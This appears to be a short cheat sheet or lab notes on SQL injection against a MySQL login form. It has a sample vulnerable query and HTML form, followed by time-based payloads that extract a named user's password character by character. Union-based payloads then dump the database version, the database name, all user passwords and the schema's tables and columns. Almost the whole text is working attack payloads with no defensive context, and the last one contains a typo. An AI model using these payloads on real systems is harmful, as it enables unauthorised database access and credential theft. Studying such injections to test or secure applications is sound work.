
SELECT * FROM user WHERE username = 'toto';


<form action="http://google/com" method="POST">
<h3>Connexion</h3>
<label>Login</label></br>
<input name="input" type="text">
<label>Login</label></br>
<input name="input" type="password">
<button type="submit">send</button>
</form>

## TIME BASED
# PAYLOAD: toto' AND BENCHMARK(5000000,ENCODE('xxx','xxxxxxxx'));#
SELECT * FROM user where username = 'toto' AND BENCHMARK(5000000,ENCODE('xxx','xxxxxxxx'));

# PAYLOAD: toto' UNION SELECT IF(SUBSTRING(password,1,1) = CHAR(98),BENCHMARK(5000000,ENCODE('xxx','xxxxxxxx')),null) as id, email, password, username FROM user WHERE username = 'patrick';#
SELECT * FROM user where username = 'toto' UNION SELECT IF(SUBSTRING(password,1,1) = CHAR(98),BENCHMARK(5000000,ENCODE('xxx','xxxxxxxx')),null) as id, email, password, username FROM user WHERE username = 'patrick';


## UNION BASED
# PAYLOAD: toto' UNION SELECT 1,2,3,VERSION();#
SELECT * FROM user WHERE username = 'toto' UNION SELECT 1,2,3,VERSION();

# PAYLOAD: toto' UNION SELECT 1,2,3,DATABASE();#
SELECT * FROM user WHERE username = 'toto' UNION SELECT 1,2,3,DATABASE();

# PAYLOAD: toto' UNION SELECT 1,2,3,password FROM user;#
SELECT * FROM user WHERE username = 'toto' UNION SELECT 1,2,3,password FROM user;

# PAYLOAD: toto' UNION SELECT 1,2,3, table_name FROM information_schema.tables;#
SELECT * FROM user WHERE username = 'toto' UNION SELECT 1,2,3, table_name FROM information_schema.tables;

# PAYLOAD: toto' UNION SELECT 1,2,3, concat(table_name,0x0a,column_name) FROM information_schema.columns WHERE table_name = 'user';#
SELECT * FROM user WHERE username = 'toto' UNION SELECT 1,2,3, concat(table_name,0x21,column_name) FROM information_schema.columns WHERE table_name = 'user';

# PAYLOAD: toto' INSET SELECT 1,2,3,VERSION();#